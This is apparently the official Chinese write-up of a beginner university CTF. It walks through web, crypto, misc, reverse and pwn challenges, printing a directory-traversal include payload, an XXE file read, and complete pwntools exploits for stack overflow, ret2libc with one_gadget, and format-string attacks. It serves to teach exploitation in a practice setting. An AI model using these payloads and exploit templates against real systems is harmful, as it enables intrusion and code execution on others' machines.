---
title: Wust闲得蛋疼春节瞎欢乐赛_官方WriteUp
date: 2020-02-08 15:45:38
tags: 
- CTF 
- WriteUps
categories: 
- CTF
---


因为疫情的原因，大家在家闲着(大家内心：并不)也是闲着，不如就搭建一个平台，找一些签到题来训练一下新人，至少让新人知道比赛的流程还有一些注意事项，一些基本的操作等，题目来源于各种开源代码，包括南邮的校赛和suctf的题目。

<!-- more -->

## Web

### Web签到题

顾名思义，就是Web的签到题，但我没有想到比隔壁稍微复杂一点的签到题更少人解出来，有点出乎意料。以后这种就不能丢。

题目描述是：去百度签个到吧。这题来源于`NCTF2018`的签到题，打开题目链接，就是百度，但是我们注意到地址栏上面的是 `/secret.php`，按理说应该是 `index.php` 或者后面为空，这就心生怀疑，于是打开 `Burpsuite` 等抓包工具一步一步来，这里为了简便我直接用浏览器的`f12`，这个方法更简单更快。

![1RD1r4.png](https://s2.ax1x.com/2020/02/08/1RD1r4.png)

我们鼠标放在题目链接的时候细心可以注意到链接是 `www.cohacker.cn:5011`，但是我们打开的界面是 `/secret.php`，这就有点不对劲。打开`f12`，访问 `www.cohacker.cn:5011` ，可以看到有一个 `302` 跳转，查看头就可以找到 `flag` 了。

![1RDGZ9.png](https://s2.ax1x.com/2020/02/08/1RDGZ9.png)

因为有个跳转，所以大家可能抓的时候没留意，并且要看 `Response` 头部，可能都看 `secret.php` 的头部去了。

### Crossover

这题是 `HCTF2018` 的签到题(又是签到题)，主要考点是 `include()` 文件包含的漏洞和目录穿越，打开题目又是熟悉的滑稽，常规操作查看源代码。

![1RDK2T.png](https://s2.ax1x.com/2020/02/08/1RDK2T.png)

发现有 `source.php`，访问可得源码

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

`REQUSET ` 时需要传参 `file` ，并且需要是字符串，同时要过 `checkFile` 的函数检测，分析代码我们可以看到白名单，只能传 `source.php` 和 `hint.php`。可以利用`?`截取`hint.php`，然后利用`/`使`hint.php?`成为一个不存在的目录，最后`include`利用`../../`跳转目录读取flag。访问`hint.php`得到 `flag not here, and flag in ffffllllaaaagggg`，于是构造payload：`http://49.235.15.37:8081/index.php?file=hint.php?/../../../../../../../../../ffffllllaaaagggg` 得到flag。

### Ezphp

点击链接，直接就可以看见源码，对源码进行一波分析：

![1RDJaR.png](https://s2.ax1x.com/2020/02/08/1RDJaR.png)

通过分析，大致可以了解到这里需要传入参数 `value`，满足与`whoami`的值相同要满足10次，且要绕过md5函数

所以这里value传入数组，用来绕过MD5函数(当然爆破出符合的md5也行)。且开始时`whoami`里面的值为‘ea’，所以构造如下：

![1RDYI1.png](https://s2.ax1x.com/2020/02/08/1RDYI1.png)

（此时发现页面的开头又回显出两个新的字母，然后将ea改为这两个字母）

![1RDNPx.png](https://s2.ax1x.com/2020/02/08/1RDNPx.png)

再次构造`url`为：`?value[]=qk` (注意，每个人回显的都不一样，在2分钟内重复这样的操作10次就能拿到flag

![1RDdxO.png](https://s2.ax1x.com/2020/02/08/1RDdxO.png)

写脚本也是很快的

```python
import requests
import hashlib
import random

''' # 这是爆破md5的方法，这里也可以不用
def get_value(given):
	global dict_az
	for i in range(1000000):
		result = given
		result += random.choice(dict_az)
		result += random.choice(dict_az)
		result += random.choice(dict_az)
		result += random.choice(dict_az)
		result += random.choice(dict_az)
		m = hashlib.md5(result)
		m = m.hexdigest()
		if m[5:9] == "0000":
			print("success")
			print(m)
			return result
		else:
			pass
'''

def main(url_s):
	session = requests.Session()
	result = "ea"
	for i in range(10):
		url = url_s
		resp = session.get(url+result)
		the_page = resp.text
		# result = get_value(the_page[0:2])
		result = the_page[0:2]
		print("nums = %d" % i)
	index_1 = the_page.find("wctf")
	index_2 = the_page.find("}")
	print(the_page[index_1:index_2+1])


if __name__ == "__main__":
	dict_az = "abcdefghijklmnopqrstuvwxyz"
	url = "http://www.cohacker.cn:23123/challenge13.php?value[]="
	main(url)
```

![1RDOzT.png](https://s2.ax1x.com/2020/02/08/1RDOzT.png)

### 男人就要快：

进入链接，看到页面：

![1RDBse.png](https://s2.ax1x.com/2020/02/08/1RDBse.png)

（英语不好的，直接放百度翻译翻译一下）

![1RDydA.png](https://s2.ax1x.com/2020/02/08/1RDydA.png)

大致意思呢就是提交'true'或者'false'，判断页面的那个式子是否正确，需要连续判断20次，且每一次都要判断正确（这里有个小坑就是，不是让你提交最后的结果，而是提交true或者false），还有一个小坑就是需要在1-2s内提交（注意，提交需要超过一秒，但是不能慢于两秒）

所以，这里是用Python脚本来处理（需要了解的模块，`request`， `re`或者`BeautifulSoup`，`time`模块）

![1RD2JP.png](https://s2.ax1x.com/2020/02/08/1RD2JP.png)

20s之后，就可以拿到flag

![1RDRRf.png](https://s2.ax1x.com/2020/02/08/1RDRRf.png)

### 你太闲了

![1RDWz8.png](https://s2.ax1x.com/2020/02/08/1RDWz8.png)

一开始就这样一个界面，我们去看一下前端的代码：![1RDhQS.png](https://s2.ax1x.com/2020/02/08/1RDhQS.png)

![1RD4sg.png](https://s2.ax1x.com/2020/02/08/1RD4sg.png)

我们页面随便输一下内容

![1RD5LQ.png](https://s2.ax1x.com/2020/02/08/1RD5LQ.png)

发现它将 `UserName` 的内容输出到页面上，跟XML有关的漏洞，我们这里尝试使用XXE（外部实体注入）漏洞---OWASP TOP 10 漏洞之一

![1RD7on.png](https://s2.ax1x.com/2020/02/08/1RD7on.png)

根据提示，flag放在/flag里面，我们读取一下：

![1RDjQU.png](https://s2.ax1x.com/2020/02/08/1RDjQU.png)

然后就得到flag了

![1RDvyF.png](https://s2.ax1x.com/2020/02/08/1RDvyF.png)

![1RH0lF.png](https://s2.ax1x.com/2020/02/08/1RH0lF.png)

## Crypto

这次的密码学题目主要目的就是把一些奇淫技巧都让新人见识一下，因此抽取了一些比较无脑的题目，直接在线跑就可以。

### 你是猪吗

题目说得很明显了，跟猪有关，不难想到是猪圈密码，百度找到猪圈密码，对应把 flag 拼出来就可以，这里 flag 设置了大小写不敏感，也算是降低了难度，送分题。

[参考资料：维基百科-Pigpen_cipher](https://en.wikipedia.org/wiki/Pigpen_cipher)

![1RDnP0.png](https://s2.ax1x.com/2020/02/08/1RDnP0.png)

### knock knock

摩斯电码，没有什么技术含量，也是调查问卷评为无聊的一题了，直接百度Google一把梭找到链接直接转换，题目提示了 flag 为有意义小写字母及数字，所以要是转成大写的得自己转成小写，送分题。

### F**k your brain

brainfuck 编码，也是Google一下就找到在线网站，直接解编码就可以，主要是需要认得出来和学会根据题目等信息去寻找信息，送分题。

### look at your keyboard

关键词 keyboard，那就看键盘，可以看到每一个以空格分隔的字符串，在键盘上刚好圈出一个字母，加上格式 wctf{} 即可，送分题。

### base

根据题目不难想到是base编码的变种，并且table都已经给出来了，不懂的可以参考[维基百科-base64](https://en.wikipedia.org/wiki/Base64)，题目只是把表换了一下，并且这种题可以先根据表把给出的编码字母替换掉，再进行正常的 base64 解码，这样操作就比较简单。

手动也能做，这里贴一下脚本

```python
import base64

string1 = "wctfEFGHIOPQJKLMNRSTUVklmWXYZabBdeDghijnop45678qrsCuvAxyz01239+/"
string2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
base = b'axKvWn7DmlKiKgRBJlKBWnV8BN=='
flag = ''
for i in base:
	if chr(i) != '=':
		index = string1.find(chr(i))
		flag += string2[index]
	else:
		flag += '='
print(flag)
print(base64.b64decode(flag))
```

运行结果：

```shell
d2N0ZntiYXNlNjRfMXNfZnVufQ==
b'wctf{base64_1s_fun}'
[Finished in 0.1s]
```

密码学题都是送分题，这里不多说。

## Misc

### 武汉加油 中国加油

签到题，把 flag 复制就可以，送分题。

### Different

题目说了 Different，那就是找不同，一般是比对十六进制数据，用 Beyond Compare 打开对比，标红差别就行，送分题。

![1RDUG6.png](https://s2.ax1x.com/2020/02/08/1RDUG6.png)

### You are a good man

题目信息写了180cm，然后放出hint说很高，那直接把解题思路都说清楚了：改图片高度。我们先右键查看一下它的尺寸

![1RDDqH.png](https://s2.ax1x.com/2020/02/08/1RDDqH.png)

1125，我们用程序员计算器（Windows自带）将十六进制数计算出来，为 465。

![1RD6II.png](https://s2.ax1x.com/2020/02/08/1RD6II.png)

然后用 Winhex 打开(其它十六进制编辑器也可以，如010 Editor等)，寻找 04 65的关键字样，注意第二个才是高，将他改高一点即可，如改成1400，转换成十六进制就是 578，即05 78，修改后保存即可（预期解是1313）。

![1RDgit.png](https://s2.ax1x.com/2020/02/08/1RDgit.png)

​	

这是原图

![1RHDOJ.jpg](https://s2.ax1x.com/2020/02/08/1RHDOJ.jpg)

### Guess Where I am

这题灵感来自 C1CTF 的，也算是借鉴了，图片找了一个比较哲学的，虽然跟题目没有任何关系，题目表述为`Shakespeare will figure out you should take a guess`，一个 `out` 一个 `guess`，提示已经很明确是使用工具 `outguess`了，选择这个出题思路也是发现学校好像没什么接触过这个工具，刚好可以借机让大家知道一下。

安装工具自行Google即可，不做阐述，工具有了，这题也就是送分题了。

```shell
# 使用命令
-> outguess -r guess.jpg flag
-> cat flag | base64 -d
# 这里提取出来的数据是base64编码过，因此需要再解码一下
```

![1RDoZj.png](https://s2.ax1x.com/2020/02/08/1RDoZj.png)

### 调查问卷

我是做梦没想到这个可以难到一些人，直接填写调查问卷即可拿flag，顺便拿点反馈做个统计，以后好改进，毕竟是Google表单，因此需要挂个梯子，题目也说明了需要科学上网，填好之后就送flag了，送分题。

![1RDTds.png](https://s2.ax1x.com/2020/02/08/1RDTds.png)



## Reverse

### EasyRe

在学校主站上也放过，原题，也是bugku中最简单的逆向题，题目也提示了 `IDA is a good tool`，我们直接拖进 IDA，就可以看到一串比较明显的东西。

![1RDxL4.png](https://s2.ax1x.com/2020/02/08/1RDxL4.png)

最简单的方法，手动按`r`，用眼睛看，flag就有了，主要是让大家把IDA装好并简单使用。

![1RHBy4.png](https://s2.ax1x.com/2020/02/08/1RHBy4.png)

### junkcode

![1W9Lh4.png](https://s2.ax1x.com/2020/02/08/1W9Lh4.png)

直接看到我们程序调用的这个地方会发现地址是红色的，没有识别成一个函数，主要是因为IDA是使用的线性扫描法，碰到花指令时就会出现如上情况，这种比较小程序的可以手动去花指令

#### step 1

![1W9j39.png](https://s2.ax1x.com/2020/02/08/1W9j39.png)

如果我们直接在开始处强行Create function，IDA会报如下错误`undefined instruction`在`text:00000000004007A3`，过去看一下

![1W9vcR.png](https://s2.ax1x.com/2020/02/08/1W9vcR.png)

很明显中间有一个Byte的指令根本没有用到，我们把它nop（机器码0x90，代表什么也不做）掉

可以Ctrl+Alt+K使用keypatch，也可以到HEX里面找到对应位置按F2修改成90，效果如下：

![1W9xj1.png](https://s2.ax1x.com/2020/02/08/1W9xj1.png)

然后在此处按C把数据转成指令

![1WCSnx.png](https://s2.ax1x.com/2020/02/08/1WCSnx.png)

再回来create就发现能成功了：

![1WCpB6.png](https://s2.ax1x.com/2020/02/08/1WCpB6.png)

#### step2

但是无法f5，会显示

![1WC9HK.png](https://s2.ax1x.com/2020/02/08/1WC9HK.png)

是因为这里还有一个花指令

![1WCPAO.png](https://s2.ax1x.com/2020/02/08/1WCPAO.png)

这个add rsp,64h显然没有任何作用，可是这种指令会干扰IDA分析函数，add rsp一般只出现在函数调用后用来释放参数空间和对齐，直接nop掉这条指令再f5

![1WCiND.png](https://s2.ax1x.com/2020/02/08/1WCiND.png)

接下来就是正常的程序分析了

#### Exploit

按 r 将 `dest` 转成字符形式

![1fIFU0.png](https://s2.ax1x.com/2020/02/09/1fIFU0.png)

我们跟踪 `src` 看到为`k^a3``7z`

![1fIiEq.png](https://s2.ax1x.com/2020/02/09/1fIiEq.png)

写脚本计算出来就可以了，exp：

```python
#!/usr/bin/env
#encoding=utf-8

str = b'wdviO{Uk^a3``7z'
flag1 = ''
flag2 = ''
for i in range(8):
	flag1 += chr(str[i] - i)
	flag2 += chr(str[i+8] ^ i)
flag = flag1 + flag2
print(flag)
```

运行结果:

```shell
λ python exp.py
wctf{JuNk_c0de1}
```

## Pwn

### warmup

一个基础栈溢出

#### 程序分析

![1W9TBV.png](https://s2.ax1x.com/2020/02/08/1W9TBV.png)

这个题本身没有开保护，旨在想让你们先了解一下什么是栈溢出

![1W977T.png](https://s2.ax1x.com/2020/02/08/1W977T.png)

首先打印了一个函数地址

对应的函数如下：

![1W94cn.png](https://s2.ax1x.com/2020/02/08/1W94cn.png)

然后write出提示之后通过gets输入造成栈溢出，这里的`gets(&v5,">")`带着一个`">"`主要是ida识别的时候会有些问题，这个`">"`字符串的地址本来是前一个`write`函数的第二个参数，这里识别出错就成了gets带着两个参数

#### 计算偏移量

既然知道是栈溢出了，首先就要计算偏移量，v5从`[rbp-40h]`的地方开始，然后`[rbp]`处还有8个字节，所以构造的payload就应该是'a'\*0x40+'b'\*0x8+p64(想要劫持到的函数地址)，实现程序流劫持

#### Exploit

具体exp如下(因为我写exp的时候都是用的一个Demo.py，所以具体的实现过程只用看`# todo here`即可，这里只有两行)

```python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './warmup'	#binary's name here
context.binary = binary		#context here
context.log_level='debug'
pty = process.PTY
p = process(binary, aslr = 1, stdin=pty, stdout=pty)	#process option here
'''
Host =
Port =
p = remote(Host,Port)
'''
elf = ELF(binary)
libc = elf.libc

my_u64 = lambda x: u64(x.ljust(8, '\0'))
my_u32 = lambda x: u32(x.ljust(4, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000
#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")

# todo here
p.recvuntil('>')
p.sendline('a'*0x40+'b'*0x8+p64(0x40060d))

p.interactive()
```

后面的题就是想拿给18级做的了，19级能搭起前面这个题的环境还有成功复现就很不错了XD

### pwn1

#### 程序分析

![1W95Xq.png](https://s2.ax1x.com/2020/02/08/1W95Xq.png)

开启栈不可执行，没有canary、PIE

![1W9h1s.png](https://s2.ax1x.com/2020/02/08/1W9h1s.png)

先输入到`buf 0xA`字节，然后`read(0,&s1,0x100)`一个很明显的栈溢出，后面的ok和fail没什么用

由于只有一次溢出，程序也没有后门，所以我们需要先leak出一个libc的地址，然后漏洞点重复利用，回到main，然后ret2libc

#### leak

先用`ROPgadget`寻找`gadget：pop rdi ret`

然后第一次的payload：`payload='a'*0x20+'b'*8+p64(prdi_ret)+p64(puts_GOT)+p64(puts_plt)+p64(main)`

利用`puts_plt`把`puts`函数的GOT表项打出来，然后回到main

第二次根据puts函数的地址和固定偏移计算出`libc`的加载地址，至于这些偏移可以在脚本里面写`symbols['puts']`也可以直接用`gdb`调试时 ：p puts然后`vmmap`查看基址，相减得到偏移

#### ret

得到基址之后使用one_gadget，满足限制条件即可，或者利用libc里面的`/bin/sh`地址，调用`system`也行（个人推荐用one_gadget，方便很多）

第二次的payload：`payload='a'*0x20+'b'*8+p64(libc_base+one_gadget_offset)`

#### Exploit

```python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './pwn1'      #binary's name here
context.binary = binary         #context here
context.log_level='debug'
pty = process.PTY
p = process(binary, aslr = 1, stdin=pty, stdout=pty)    #process option here
'''
Host =
Port =
p = remote(Host,Port)
'''
elf = ELF(binary)
libc = elf.libc

my_u64 = lambda x: u64(x.ljust(8, '\0'))
my_u32 = lambda x: u32(x.ljust(4, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000
#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")

# todo here
p.recvuntil('your name\n')
p.send('Coldshield')
p.recvuntil('the key?\n')

prdi_ret=0x00000000004012ab
puts_GOT=0x404018
puts_plt=0x401030
main=0x401162
payload='a'*0x20+'b'*8+p64(prdi_ret)+p64(puts_GOT)+p64(puts_plt)+p64(main)

p.send(payload)

puts_offset=0x6f690
one_gadget_offset=0x45216
p.recvuntil('fail!\n')
libc_base=my_u64(p.recv(6))-puts_offset
log.info("\033[1;36m" + 'libc_base:'+hex(libc_base) + "\033[0m")

p.recvuntil('your name\n')
p.send('Coldshield')
p.recvuntil('the key?\n')
payload='a'*0x20+'b'*8+p64(libc_base+one_gadget_offset)
p.send(payload)
p.interactive()
```

### rand

这个题是我出的一个题，具体结合了格式化字符串还有栈上变量的覆盖

#### 程序分析

![1W9bAU.png](https://s2.ax1x.com/2020/02/08/1W9bAU.png)

没有canary和PIE

![1W9qNF.png](https://s2.ax1x.com/2020/02/08/1W9qNF.png)

`read(0,&buf,0x30)`很明显能溢出到`seed`，覆盖其为我们控制的值就可以预测rand()产生的值

通过随机数检测之后，下面有一个格式化字符串漏洞，是将我们前面用来覆盖`seed`输入的name打印出来，直接打印栈上任何存在的一个`libc`地址即可（可以直接看有没有哪个值是属于`libc`的），但是其中main函数的返回地址固定是`___libc_start_main`中的偏移，具体见我之前暑假写的ELF执行全流程，所以计算出调用`printf`时这个返回地址的偏移即可

payload1(name)：`p.send('%19$p'.ljust(0x28,'a')+p64(0))`

最后一个say something只能使用`one_gadget`，因为溢出字节只到了返回地址

payload2：`payload='\x00'*0x50+'b'*8+p64(libc_base+0x45216)`

#### Exploit

```python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *
from ctypes import *

binary = './rand'	#binary's name here
context.binary = binary		#context here
context.log_level='debug'
pty = process.PTY
p = process(binary, aslr = 1, stdin=pty, stdout=pty)	#process option here
'''
Host =
Port =
p = remote(Host,Port)
'''
elf = ELF(binary)
libc = elf.libc

my_u64 = lambda x: u64(x.ljust(8, '\0'))
my_u32 = lambda x: u32(x.ljust(4, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000
#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")

# todo here
lib = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
lib.srand(0)

#gdb.attach(p,"b *0x40081C")
p.recvuntil('name?\n')

p.send('%19$p'.ljust(0x28,'a')+p64(0))

p.recvuntil('rand game\n')
for x in range(10):
	num=lib.rand() % 999
	p.sendline(str(num))
	p.recvuntil('Win\n')

p.recvuntil('Your name is:\n')

libc_base=int(p.recv(14),16)-0x20830
log.info("\033[1;36m" + hex(libc_base) + "\033[0m")
payload='\x00'*0x50+'b'*8+p64(libc_base+0x45216)
p.recvuntil('something?\n')
p.send(payload)

p.interactive()

```

### fmt

`suctf playfmt`原题，可以自己上网找找wp，至于`fopen`之后为什么能够这样修改偏移可以改到对应的flag地址，可以了解一下IO file，不过比赛时这种偏移可以直接调试看就好了

参考：https://cloud.tencent.com/developer/article/1492955